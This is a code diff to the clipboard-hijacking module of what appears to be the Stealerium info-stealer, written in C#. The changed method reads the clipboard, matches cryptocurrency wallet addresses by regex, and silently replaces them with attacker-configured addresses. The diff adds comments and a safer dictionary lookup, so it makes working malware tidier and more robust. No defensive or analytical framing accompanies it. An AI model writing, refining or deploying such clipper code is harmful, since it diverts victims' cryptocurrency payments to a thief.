@@ -2,26 +2,46 @@
 
 namespace Stealerium.Clipper
 {
+    /// <summary>
+    /// The Buffer class is responsible for monitoring and replacing cryptocurrency addresses
+    /// found in the clipboard with predefined addresses.
+    /// </summary>
     internal sealed class Buffer
     {
-        // Find & Replace crypto addresses in clipboard
+        /// <summary>
+        /// Finds and replaces cryptocurrency addresses in the clipboard content.
+        /// </summary>
         public static void Replace()
         {
-            var buffer = ClipboardManager.ClipboardText;
-            if (string.IsNullOrEmpty(buffer))
-                return;
-            foreach (var dictonary in RegexPatterns.PatternsList)
+            // Retrieve the current clipboard text content
+            var clipboardContent = Clipboard.GetText();
+
+            // If clipboard is empty or null, exit the method
+            if (string.IsNullOrEmpty(clipboardContent))
             {
-                var cryptocurrency = dictonary.Key;
-                var pattern = dictonary.Value;
-                if (pattern.Match(buffer).Success)
+                return;
+            }
+
+            // Iterate over the list of cryptocurrency patterns
+            foreach (var dictionaryEntry in RegexPatterns.PatternsList)
+            {
+                var cryptocurrency = dictionaryEntry.Key;
+                var pattern = dictionaryEntry.Value;
+
+                // Check if the clipboard content matches the cryptocurrency address pattern
+                if (pattern.Match(clipboardContent).Success)
                 {
-                    var replaceTo = Config.ClipperAddresses[cryptocurrency];
-                    if (!string.IsNullOrEmpty(replaceTo) && !replaceTo.Contains("---") && !buffer.Equals(replaceTo))
+                    // Get the replacement address for the matched cryptocurrency
+                    var replaceTo = Config.ClipperAddresses.ContainsKey(cryptocurrency)
+                        ? Config.ClipperAddresses[cryptocurrency]
+                        : null;
+
+                    // Replace the address in the clipboard if the replacement is valid
+                    if (!string.IsNullOrEmpty(replaceTo) && !replaceTo.Contains("---") && !clipboardContent.Equals(replaceTo))
                     {
-                        Clipboard.SetText(replaceTo);
-                        Logging.Log("Clipper replaced to " + replaceTo);
-                        return;
+                        Clipboard.SetText(replaceTo);  // Set the new clipboard content
+                        Logging.Log($"Clipper replaced to {replaceTo}");  // Log the replacement
+                        return;  // Exit after the first successful replacement
                     }
                 }
             }
